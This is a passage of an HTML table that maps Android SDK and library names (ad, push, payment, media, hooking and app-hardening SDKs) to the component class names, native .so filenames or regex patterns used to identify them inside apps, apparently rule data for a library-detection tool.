ProfileInstaller</td><td>androidx.profileinstaller.ProfileInstallReceiver</td></tr><tr><td>Qigsaw</td><td>com.iqiyi.android.qigsaw.core.splitinstall.remote.SplitInstallService</td></tr><tr><td>Qigsaw</td><td>com.iqiyi.android.qigsaw.core.splitinstall.SplitCleanService</td></tr><tr><td>Qigsaw</td><td>com.iqiyi.android.qigsaw.core.splitrequest.splitinfo.SplitUpdateService</td></tr><tr><td>Qigsaw</td><td>com.iqiyi.android.qigsaw.core.DefaultObtainUserConfirmationDialog</td></tr><tr><td>Google Play Service</td><td>com.google.android.play.core.assetpacks.ExtractionForegroundService</td></tr><tr><td>ZXing Android Embedded</td><td>com.journeyapps.barcodescanner.CaptureActivity</td></tr><tr><td>ProcessPhoenix</td><td>com.jakewharton.processphoenix.ProcessPhoenix</td></tr><tr><td>IJKPlayer</td><td>tv.danmaku.ijk.media.player.services.IjkMediaPlayerService</td></tr><tr><td>IJKPlayer</td><td>tv.danmaku.ijk.media.player.services.IjkMediaPlayerNoUIActivity</td></tr><tr><td>Firebase C++ SDK</td><td>libFirebaseCpp(.*).so</td></tr><tr><td>LSPatch</td><td>liblspd.so</td></tr><tr><td>LSPatch</td><td>org.lsposed.lspatch</td></tr><tr><td>Trojan-Go</td><td>libtrojan-go.so</td></tr><tr><td>Rime Core</td><td>librime.so</td></tr><tr><td>Rime Core</td><td>librime_jni.so</td></tr><tr><td>Lib XUL</td><td>libxul.so</td></tr><tr><td>阿里聚安全</td><td>libsgmiddletier.so</td></tr><tr><td>小米账号开放平台</td><td>com.xiaomi.accountsdk.diagnosis.ui.PassportDiagnosisActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.ads.DialogActivity</td></tr><tr><td>实人认证 SDK</td><td>com.alibaba.security.realidentity.activity.RPWebViewActivity</td></tr><tr><td>实人认证 SDK</td><td>com.alibaba.security.realidentity.activity.RPTakePhotoActivity</td></tr><tr><td>实人认证 SDK</td><td>com.alibaba.security.biometrics.activity.ALModelLoadingActivity</td></tr><tr><td>实人认证 SDK</td><td>com.alibaba.security.biometrics.activity.ALBiometricsActivity</td></tr><tr><td>实人认证 SDK</td><td>libALBiometricsJni.so</td></tr><tr><td>微博 SDK</td><td>libsharewind.so</td></tr><tr><td>Facebook SDK</td><td>libfbjni.so</td></tr><tr><td>Sentry</td><td>io.sentry.android.core.SentryPerformanceProvider</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.content.FileProvider</td></tr><tr><td>友盟推送</td><td>com.umeng.message.notify.UPushMessageNotifyActivity</td></tr><tr><td>友盟推送</td><td>com.umeng.message.UPushBoardActivity</td></tr><tr><td>友盟推送</td><td>com.umeng.message.UMessageNotifyActivity</td></tr><tr><td>Meizu Push</td><td>com.meizu.cloud.pushsdk.MzPushSystemReceiver</td></tr><tr><td>抖音 SDK</td><td>com.bytedance.sdk.open.douyin.ui.DouYinWebAuthorizeActivity</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.sdk.openadsdk.stub.server.DownloaderServerManager</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.pangle.servermanager.MainServerManager</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.pangle.provider.MainProcessProviderProxy</td></tr><tr><td>ZBar</td><td>cn.bertsir.zbar.utils.QrFileProvider</td></tr><tr><td>Neptune</td><td>org.qiyi.pluginlibrary.install.PluginInstallerService</td></tr><tr><td>Neptune</td><td>org.qiyi.pluginlibrary.pm.PluginPackageManagerService</td></tr><tr><td>Neptune</td><td>org.qiyi.pluginlibrary.component.(.*)</td></tr><tr><td>Neptune</td><td>org.qiyi.pluginlibrary.component.ServiceProxy0</td></tr><tr><td>Neptune</td><td>org.qiyi.pluginlibrary.component.ServiceProxy1</td></tr><tr><td>Neptune</td><td>org.qiyi.pluginlibrary.component.ServiceProxy2</td></tr><tr><td>Neptune</td><td>org.qiyi.pluginlibrary.component.ServiceProxy3</td></tr><tr><td>Neptune</td><td>org.qiyi.pluginlibrary.component.ContentProviderProxy1</td></tr><tr><td>Neptune</td><td>org.qiyi.pluginlibrary.pm.PluginPackageManagerProvider</td></tr><tr><td>360 加固</td><td>libX86Bridge.so</td></tr><tr><td>快应用</td><td>org.hapjs.(.*)</td></tr><tr><td>VirtualAPK</td><td>com.didi.virtualapk.delegate.RemoteContentProvider</td></tr><tr><td>VirtualAPK</td><td>com.didi.virtualapk.(.*)</td></tr><tr><td>OPPO Push(GeTui Proxy)</td><td>com.igexin.sdk.OppoAppPushService</td></tr><tr><td>HUAWEI Push(GeTui Proxy)</td><td>com.igexin.sdk.HmsPushMessageService</td></tr><tr><td>HMS Core</td><td>com.huawei.hms.device.provider.CheckHmsProvider</td></tr><tr><td>招商银行 SDK</td><td>cmbapi.CMBApiEntryActivity</td></tr><tr><td>Pangle SDK</td><td>libpangleflipped.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_ai_denoise_extension.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_ci_extension.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_dav1d_extension.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_fd_extension.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_fdkaac.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_jnd_extension.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora-mpg123.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_segmentation_extension.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_super_resolution_extension.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_video_process_extension.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora-core.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora-ffmpeg.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora-rtc-sdk.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora-soundtouch.so</td></tr><tr><td>Filament</td><td>libfilament-utils-jni.so</td></tr><tr><td>Filament</td><td>libfilament-jni.so</td></tr><tr><td>Filament</td><td>libgltfio-jni.so</td></tr><tr><td>Jetpack Test</td><td>androidx.test.core.app.InstrumentationActivityInvoker$BootstrapActivity</td></tr><tr><td>Jetpack Test</td><td>androidx.test.core.app.InstrumentationActivityInvoker$EmptyActivity</td></tr><tr><td>Jetpack Test</td><td>androidx.test.core.app.InstrumentationActivityInvoker$EmptyFloatingActivity</td></tr><tr><td>Hermes</td><td>libhermes-executor-debug.so</td></tr><tr><td>Hermes</td><td>libhermes-executor-release.so</td></tr><tr><td>Hermes</td><td>libhermes-inspector.so</td></tr><tr><td>Hermes</td><td>libhermes.so</td></tr><tr><td>阿里聚安全</td><td>libsgmainso-(.*).so</td></tr><tr><td>MSA SDK</td><td>libmsaoaidauth.so</td></tr><tr><td>MSA SDK</td><td>libmsaoaidsec.so</td></tr><tr><td>闪验 SDK</td><td>com.chuanglan.shanyan_sdk.view.ShanYanOneKeyActivity</td></tr><tr><td>闪验 SDK</td><td>com.chuanglan.shanyan_sdk.view.CmccLoginActivity</td></tr><tr><td>闪验 SDK</td><td>com.chuanglan.shanyan_sdk.view.CTCCPrivacyProtocolActivity</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.sdk.openadsdk.(.*)</td></tr><tr><td>网易云信</td><td>libtraceroute.so</td></tr><tr><td>网易云信</td><td>libne_audio.so</td></tr><tr><td>网易云信</td><td>libhigh-available.so</td></tr><tr><td>网易云信</td><td>libnertc_sdk.so</td></tr><tr><td>网易云信</td><td>libvideoeffect.so</td></tr><tr><td>网易云信</td><td>liblivestreaming.so</td></tr><tr><td>网易云信</td><td>libnelprender.so</td></tr><tr><td>网易云信</td><td>libnelpengine.so</td></tr><tr><td>网易云信</td><td>libRtsSDK.so</td></tr><tr><td>网易云信</td><td>libneliveplayer.so</td></tr><tr><td>Sense</td><td>com.highcapable.sense.SenseActivity</td></tr><tr><td>Quack</td><td>libquack.so</td></tr><tr><td>AppLovin</td><td>com.applovin.sdk.AppLovinInitProvider</td></tr><tr><td>AppLovin</td><td>com.applovin.(.*)</td></tr><tr><td>AppLovin</td><td>com.applovin.impl.sdk.utils.AppKilledService</td></tr><tr><td>AppLovin</td><td>com.applovin.impl.adview.activity.FullscreenAdService</td></tr><tr><td>Audience Network SDK</td><td>com.facebook.ads.AudienceNetworkActivity</td></tr><tr><td>Kwai Ad SDK</td><td>com.kwad.sdk.api.proxy.(.*)</td></tr><tr><td>Kwai Ad SDK</td><td>com.kwad.sdk.api.proxy.(.*)</td></tr><tr><td>Kwai Ad SDK</td><td>com.kwad.sdk.api.proxy.app.AdSdkFileProvider</td></tr><tr><td>个推</td><td>com.getui.gtc.GtcService</td></tr><tr><td>个推</td><td>com.getui.gtc.base.GtcProvider</td></tr><tr><td>快手开放平台</td><td>com.kwai.auth.login.kwailogin.h5login.KwaiH5LoginActivity</td></tr><tr><td>快手开放平台</td><td>com.kwai.auth.login.kwailogin.applogin.RouteHandlerActivity</td></tr><tr><td>快手开放平台</td><td>com.kwai.opensdk.sdk.openapi.KwaiHandlerActivity</td></tr><tr><td>快手开放平台</td><td>com.kwai.opensdk.sdk.openapi.KwaiRouterActivity</td></tr><tr><td>快手开放平台</td><td>com.kwai.opensdk.sdk.LoadingActivity</td></tr><tr><td>Games plugin for Unity</td><td>com.google.games.bridge.(.*)</td></tr><tr><td>Games plugin for Unity</td><td>libgpg.so</td></tr><tr><td>TBS</td><td>liblbs.so</td></tr><tr><td>cocos2d-x</td><td>libMyGame.so</td></tr><tr><td>GL4ES</td><td>libgl4es.so</td></tr><tr><td>HUAWEI WebView</td><td>libwebviewchromium.huawei.so</td></tr><tr><td>XQUIC</td><td>libxquic.so</td></tr><tr><td>RUpgrade</td><td>libr_upgrade_lib.so</td></tr><tr><td>quiche</td><td>libquiche.so</td></tr><tr><td>Godot Engine</td><td>libgodot_android.so</td></tr><tr><td>GameMaker Studio</td><td>libyoyo.so</td></tr><tr><td>腾讯地图 SDK</td><td>liblocationbeaconid.so</td></tr><tr><td>腾讯地图 SDK</td><td>liblocationlocalenc.so</td></tr><tr><td>智能小程序</td><td>com.baidu.swan.(.*)</td></tr><tr><td>智能小程序</td><td>com.baidu.swan.(.*)</td></tr><tr><td>智能小程序</td><td>com.baidu.swan.uuid.sync.SyncProvider</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.android.tpush.InnerTpnsActivity</td></tr><tr><td>移动号码认证</td><td>com.cmic.sso.sdk.view.LoginAuthActivity</td></tr><tr><td>小米广告 SDK</td><td>com.miui.zeus.mimo.sdk.ad.reward.RewardVideoAdActivity</td></tr><tr><td>小米广告 SDK</td><td>com.miui.zeus.mimo.sdk.view.WebViewActivity</td></tr><tr><td>小米广告 SDK</td><td>com.miui.zeus.landingpage.sdk.activity.WebViewActivity</td></tr><tr><td>Jetpack CameraX</td><td>androidx.camera.core.impl.MetadataHolderService</td></tr><tr><td>MMKV</td><td>com.tencent.mmkv.MMKVContentProvider</td></tr><tr><td>Matrix</td><td>libmatrix-fd.so</td></tr><tr><td>Matrix</td><td>libmatrix-hookcommon.so</td></tr><tr><td>Matrix</td><td>libmatrix-jectl.so</td></tr><tr><td>Matrix</td><td>libmatrix-memguard.so</td></tr><tr><td>Matrix</td><td>libmatrix-memoryhook.so</td></tr><tr><td>Matrix</td><td>libmatrix-pthreadhook.so</td></tr><tr><td>Matrix</td><td>libmatrix-opengl-leak.so</td></tr><tr><td>Matrix</td><td>libmatrix-traffic.so</td></tr><tr><td>Matrix</td><td>libmatrix_resource_canary.so</td></tr><tr><td>Matrix</td><td>libmatrixmrs.so</td></tr><tr><td>Agora RTC SDK</td><td>libAgoraMediaPlayer.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora-player-ffmpeg.so</td></tr><tr><td>TBS</td><td>com.tencent.smtt.utils.FileProvider</td></tr><tr><td>HMS Scan Kit</td><td>com.huawei.hms.hmsscankit.ScanKitActivity</td></tr><tr><td>FinClip</td><td>libsdkcore.so</td></tr><tr><td>FinClip</td><td>libfin-yuvutil.so</td></tr><tr><td>imebra</td><td>libimebra_lib.so</td></tr><tr><td>FMOD</td><td>libfmod.so</td></tr><tr><td>Jetpack Compose</td><td>androidx.compose</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5Activity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5TransActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5FileChooserActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5NetworkCheckActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.wallet.H5DevAppActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.dev.ui.H5BugMeSettingsActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5MainProcTinyActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5Activity$H5Activity1</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5Activity$H5Activity2</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5Activity$H5Activity3</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5Activity$H5Activity4</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5Activity$H5Activity5</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5TransActivity$H5TransActivity0</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5TransActivity$H5TransActivity1</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5TransActivity$H5TransActivity2</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5TransActivity$H5TransActivity3</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5TransActivity$H5TransActivity4</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5TransActivity$H5TransActivity5</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5NebulaAppActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulacore.ui.H5TransLandscapeActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebula.appcenter.apphandler.loadingview.H5LoadingActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulaappproxy.activity.MiniProgramOpenSettingActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulaappproxy.ipc.H5ProcessTransActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulaappproxy.inside.contact.H5ContactTransparentActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulaappproxy.inside.account.AlipayMiniProgramAuthActivity</td></tr><tr><td>Nebula SDK</td><td>com.alipay.mobile.nebulaappproxy.inside.account.MiniProgramAuthService</td></tr><tr><td>mPaaS 扫一扫</td><td>com.alipay.mobile.scansdk.activity.ToolsCaptureActivity</td></tr><tr><td>mPaaS 扫一扫</td><td>com.alipay.mobile.scansdk.activity.MPaasToolsCaptureActivity</td></tr><tr><td>MiPush</td><td>com.xiaomi.mipush.sdk.NotificationClickedActivity</td></tr><tr><td>旷视 SDK</td><td>com.megvii.meglive_sdk.detect.fmp.FmpLivenessActivity</td></tr><tr><td>旷视 SDK</td><td>com.megvii.meglive_sdk.detect.action.ActionLivenessActivity</td></tr><tr><td>旷视 SDK</td><td>com.megvii.meglive_sdk.detect.color.FmpColorfulActivity</td></tr><tr><td>旷视 SDK</td><td>com.megvii.meglive_sdk.detect.guide.GrantActivity</td></tr><tr><td>旷视 SDK</td><td>com.megvii.meglive_sdk.detect.agreement.UserAgreementActivity</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.core.loading.impl.LoadingPage</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.common.logging.process.LogServiceInlite1</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.common.logging.process.LogServiceInlite2</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.common.logging.process.LogServiceInlite3</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.common.logging.process.LogServiceInlite4</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.common.logging.process.LogServiceInlite5</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.common.logging.process.LogServiceInMainProcess</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.common.logging.process.LogServiceInPushProcess</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.common.logging.process.LogServiceInToolsProcess</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.logmonitor.TraceStubReceiver</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.logmonitor.ClientMonitorExtReceiver</td></tr><tr><td>mPaaS</td><td>com.alipay.android.phone.mobilesdk.apm.service.APMInnerService</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.logmonitor.ClientMonitorService</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.quinox.activity.StubActivity</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.quinox.classloader.DexOptServiceInToolsProcess</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.quinox.preload.PreloadFodderActivity</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.quinox.preload.PreloadService</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.quinox.preload.MainPldService</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.quinox.preload.ExcaliburService</td></tr><tr><td>mPaaS 社交分享</td><td>com.alipay.android.shareassist.ui.WeiboEditActivity</td></tr><tr><td>mPaaS 社交分享</td><td>com.alipay.android.shareassist.ui.WeiboAuthActivity</td></tr><tr><td>mPaaS 社交分享</td><td>com.alipay.auth.AuthWeiboActivity</td></tr><tr><td>mPaaS 社交分享</td><td>com.alipay.android.shareassist.ui.WeiboFrindListActivity</td></tr><tr><td>mPaaS 社交分享</td><td>com.alipay.android.shareassist.ui.WeiboCallbackActivity</td></tr><tr><td>mPaaS 社交分享</td><td>com.alipay.android.shareassist.ui.QQCallbackActivity</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.common.fgbg.FgBgMonitorService</td></tr><tr><td>mPaaS</td><td>com.alipay.mobile.rome.syncsdk.service.LongLinkService</td></tr><tr><td>智能小程序</td><td>com.baidu.swan.(.*)</td></tr><tr><td>移动应用推广 SDK</td><td>com.baidu.mobads.sdk.api.BdFileProvider</td></tr><tr><td>Flutter</td><td>io.flutter.plugins.imagepicker.ImagePickerFileProvider</td></tr><tr><td>乐播 SDK</td><td>com.hpplay.sdk.source.process.LelinkReceiver</td></tr><tr><td>腾讯御安全</td><td>libTmsdk-(.*)-mfr.so</td></tr><tr><td>Android NDK GIF</td><td>libandroidndkgif.so</td></tr><tr><td>7-Zip</td><td>lib7-Zip-JBinding.so</td></tr><tr><td>GME</td><td>libgmesdk.so</td></tr><tr><td>FFmpeg</td><td>libffmpeg.so</td></tr><tr><td>FFmpeg</td><td>libmobileffmpeg.so</td></tr><tr><td>QuickJS</td><td>libquickjs.so</td></tr><tr><td>Node.js</td><td>libnode.so</td></tr><tr><td>Sandhook</td><td>libsandhook.so</td></tr><tr><td>LSPatch</td><td>liblspatch.so</td></tr><tr><td>Matrix</td><td>com.tencent.matrix.backtrace.WarmUpService</td></tr><tr><td>AgentWeb</td><td>com.just.agentweb.ActionActivity</td></tr><tr><td>旷视 SDK</td><td>libMegActionFmpJni.so</td></tr><tr><td>旷视 SDK</td><td>libMegviiInnerUtils-(.*).so</td></tr><tr><td>旷视 SDK</td><td>libbucket2-new.so</td></tr><tr><td>HMS Scan Kit</td><td>libscannative.so</td></tr><tr><td>Logan</td><td>liblogan.so</td></tr><tr><td>HUAWEI Push</td><td>com.huawei.hms.support.api.push.TransActivity</td></tr><tr><td>MNN</td><td>libmnnkitcore.so</td></tr><tr><td>Bugly</td><td>libBugly-ext.so</td></tr><tr><td>Bugly</td><td>libBugly-webank.so</td></tr><tr><td>cocos2d-x</td><td>libcocos2djs.so</td></tr><tr><td>腾讯地图 SDK</td><td>libtxmapvis.so</td></tr><tr><td>腾讯地图 SDK</td><td>libtmsqmp.so</td></tr><tr><td>网易易盾</td><td>libnesec.so</td></tr><tr><td>Vorbis</td><td>libvorbis.so</td></tr><tr><td>Jetpack Camera2</td><td>androidx.camera.camera2.impl.Camera2Initializer</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.tg.TransPortraitADActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.tg.RewardvideoPortraitADActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.tg.RewardvideoLandscapeADActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.tg.LandscapeADActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.tg.ADActivity</td></tr><tr><td>友盟推送</td><td>com.umeng.message.UmengNotificationReceiver</td></tr><tr><td>极光推送</td><td>cn.android.service.JTransitActivity</td></tr><tr><td>AndroidP7zip</td><td>libp7zip.so</td></tr><tr><td>JAd SDK</td><td>cn.jiguang.ads.app.service.UserService</td></tr><tr><td>JAd SDK</td><td>cn.jiguang.ads.base.component.JAdActivity</td></tr><tr><td>JAd SDK</td><td>cn.jiguang.ads.base.component.JTransparentActivity</td></tr><tr><td>JAd SDK</td><td>cn.jiguang.ads.base.component.JAdProvider</td></tr><tr><td>JAd SDK</td><td>cn.jiguang.ads.base.component.JAdFileProvider</td></tr><tr><td>JAd SDK</td><td>cn.jiguang.ads.base.component.JAdReceiver</td></tr><tr><td>JAd SDK</td><td>cn.jiguang.union.ads.service.JAdFileProvider</td></tr><tr><td>App Center</td><td>com.microsoft.appcenter.distribute.DeepLinkActivity</td></tr><tr><td>App Center</td><td>com.microsoft.appcenter.distribute.AppCenterPackageInstallerReceiver</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.pangle.FileProvider</td></tr><tr><td>Mapbox Mobile Events</td><td>com.mapbox.android.telemetry.provider.MapboxTelemetryInitProvider</td></tr><tr><td>Mapbox Mobile Events</td><td>com.mapbox.android.telemetry.errors.ErrorReporterJobIntentService</td></tr><tr><td>Mapbox Mobile Events</td><td>com.mapbox.android.telemetry.MapboxTelemetryService</td></tr><tr><td>Flipper</td><td>com.facebook.flipper.android.diagnostics.FlipperDiagnosticActivity</td></tr><tr><td>HUAWEI CaaS Engine</td><td>com.huawei.caas.messageservice.JumpActivity</td></tr><tr><td>HUAWEI Health Kit</td><td>com.huawei.hms.hihealth.activity.HealthKitAuthHubActivity</td></tr><tr><td>HUAWEI Health Kit</td><td>com.huawei.hms.hihealth.activity.HealthKitTransparentActivity</td></tr><tr><td>HUAWEI Health Kit</td><td>com.huawei.hms.hihealth.activity.HealthKitWebViewActivity</td></tr><tr><td>ZBar</td><td>cn.bertsir.zbar.QRActivity</td></tr><tr><td>ZBar</td><td>cn.bertsir.zbar.utils.PermissionUtils$PermissionActivity</td></tr><tr><td>实时音视频</td><td>libvolcenginertc.so</td></tr><tr><td>神策分析 SDK</td><td>com.sensorsdata.analytics.android.sdk.dialog.SchemeActivity</td></tr><tr><td>Duktape</td><td>duktape.so</td></tr><tr><td>libusb</td><td>libusb.so</td></tr><tr><td>MongoDB</td><td>libbson.so</td></tr><tr><td>MongoDB</td><td>libcjson.so</td></tr><tr><td>libzip</td><td>libzip.so</td></tr><tr><td>libzip</td><td>libzlib.so</td></tr><tr><td>iApp</td><td>libygsiyu.so</td></tr><tr><td>离线语音合成</td><td>libAisound.so</td></tr><tr><td>libYUV</td><td>libYUVDecoder.so</td></tr><tr><td>libYUV</td><td>libyuv-decoder.so</td></tr><tr><td>Epic</td><td>libarmepic</td></tr><tr><td>RxFFmpeg</td><td>librxffmpeg-core.so</td></tr><tr><td>RxFFmpeg</td><td>librxffmpeg-invoke.so</td></tr><tr><td>RxFFmpeg</td><td>librxffmpeg-player.so</td></tr><tr><td>FMOD</td><td>libfmodL.so</td></tr><tr><td>SHook</td><td>libshook.so</td></tr><tr><td>SHook</td><td>libfoza.so</td></tr><tr><td>SHook</td><td>libspatch.so</td></tr><tr><td>MACE</td><td>libmace.so</td></tr><tr><td>MACE</td><td>libmotion_photo_mace.so</td></tr><tr><td>小米 IoT SDK</td><td>libmiio.so</td></tr><tr><td>小米 IoT SDK</td><td>libIOTCAPIs.so</td></tr><tr><td>小米 IoT SDK</td><td>libmiot_patch.so</td></tr><tr><td>TensorFlow Lite</td><td>libtensorflowlite_gpu_jni.so</td></tr><tr><td>Hermes</td><td>libhermes-executor-common-debug.so</td></tr><tr><td>Hermes</td><td>libhermes-executor-common-release.so</td></tr><tr><td>网易易盾</td><td>libnesec-x86.so</td></tr><tr><td>梆梆安全</td><td>libDexHelper-x86_64.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora-crypto.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora-fdkaac.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora-rtm-sdk-jni.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_spatial_audio_extension.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora_full_audio_format_extension.so</td></tr><tr><td>MMA SDK</td><td>libMMASignature.so</td></tr><tr><td>阿里聚安全</td><td>libsgcore.so</td></tr><tr><td>阿里聚安全</td><td>libsgnocaptcha.so</td></tr><tr><td>阿里聚安全</td><td>libsgmisc.so</td></tr><tr><td>阿里聚安全</td><td>libsgnocaptchaso(.*).so</td></tr><tr><td>极光认证 SDK</td><td>libquicklogin.so</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.JPluginFCMMessagingService</td></tr><tr><td>BHook</td><td>libbytehook.so</td></tr><tr><td>高德地图 SDK</td><td>libmp3decoder.so</td></tr><tr><td>高德地图 SDK</td><td>librtbt828.so</td></tr><tr><td>高德地图 SDK</td><td>libwtbt828.so</td></tr><tr><td>libmonochrome</td><td>libmonochrome_64.so</td></tr><tr><td>ncnn</td><td>libncnn.so</td></tr><tr><td>libp2p</td><td>libxp2p.so</td></tr><tr><td>AndroidLame</td><td>libandroidlame.so</td></tr><tr><td>Unity Mono</td><td>libmonobdwgc-2.0.so</td></tr><tr><td>Unity Mono</td><td>libMonoPosixHelper.so</td></tr><tr><td>HDiffPatch</td><td>libhpatchz.so</td></tr><tr><td>梆梆安全</td><td>libpnc-crypto.so</td></tr><tr><td>aria2</td><td>libaria2.so</td></tr><tr><td>FreeReflection</td><td>libfree-reflection.so</td></tr><tr><td>Burst</td><td>lib_burst_generated.so</td></tr><tr><td>Xamarin</td><td>libxa-internal-api.so</td></tr><tr><td>vivo 网游联运 SDK</td><td>libvivo_account_sdk.so</td></tr><tr><td>Lofelt SDK</td><td>liblofelt_sdk.so</td></tr><tr><td>Easy Mobile</td><td>libeasymobile.so</td></tr><tr><td>Pdfium</td><td>libjniPdfium.so</td></tr><tr><td>SandHook</td><td>libsandhook.so</td></tr><tr><td>SandHook</td><td>libsandhook-native.so</td></tr><tr><td>SandHook</td><td>libsandhook-art.so</td></tr><tr><td>SandHook</td><td>libsandhook64.so</td></tr><tr><td>LSPlant</td><td>liblsplant.so</td></tr><tr><td>Smart App Updates</td><td>libApkPatchLibrary.so</td></tr><tr><td>Cardboard SDK</td><td>libpano_video_renderer.so</td></tr><tr><td>Cardboard SDK</td><td>libpanorenderer.so</td></tr><tr><td>Cardboard SDK</td><td>libvraudio_engine.so</td></tr><tr><td>Cardboard SDK</td><td>libvrtoolkit.so</td></tr><tr><td>Cardboard SDK</td><td>libgvrbase.so</td></tr><tr><td>AndroidPhotoFilters</td><td>libNativeImageProcessor.so</td></tr><tr><td>SQLite</td><td>libsqlitex.so</td></tr><tr><td>OpenAL</td><td>libopenal.so</td></tr><tr><td>Google AdMob</td><td>libadmob.so</td></tr><tr><td>Google AdMob</td><td>libadmob-google.so</td></tr><tr><td>LayaAir</td><td>liblayaair.so</td></tr><tr><td>ENet</td><td>libenet.so</td></tr><tr><td>号码认证服务</td><td>libalicomphonenumberauthsdk-release_alijtca_plus.so</td></tr><tr><td>号码认证服务</td><td>libalicomphonenumberauthsdk-log-release_alijtca_plus.so</td></tr><tr><td>号码认证服务</td><td>libalicomphonenumberauthsdk-log-online-standard-release_alijtca_plus.so</td></tr><tr><td>zipw</td><td>libzipw.so</td></tr><tr><td>EasyProtector</td><td>libantitrace.so</td></tr><tr><td>MNN</td><td>libmnnpybridge.so</td></tr><tr><td>MNN</td><td>libmnncv.so</td></tr><tr><td>梆梆安全</td><td>libbangcle_crypto_tool.so</td></tr><tr><td>梆梆安全</td><td>libbangcle_risk.so</td></tr><tr><td>Pdfium</td><td>libmodft2.so</td></tr><tr><td>Pdfium</td><td>libmodpdfium.so</td></tr><tr><td>BoringSSL</td><td>libttboringssl.so</td></tr><tr><td>CFCA</td><td>libSipCryptor.so</td></tr><tr><td>CFCA</td><td>libcfcaMLog.so</td></tr><tr><td>CFCA</td><td>libcfcamkit.so</td></tr><tr><td>CFCA</td><td>libHKESipCryptor.so</td></tr><tr><td>Threadfix</td><td>libthreadfix.so</td></tr><tr><td>PAG</td><td>libpag.so</td></tr><tr><td>PAG</td><td>liblibpag.so</td></tr><tr><td>WebP</td><td>libwebpbackport.so</td></tr><tr><td>Mediastreamer2</td><td>libmediastreamer_base.so</td></tr><tr><td>Mediastreamer2</td><td>libmediastreamer_voip.so</td></tr><tr><td>Mediastreamer2</td><td>libmsx264.so</td></tr><tr><td>阿里云短视频 SDK</td><td>libalivcffmpeg.so</td></tr><tr><td>阿里云短视频 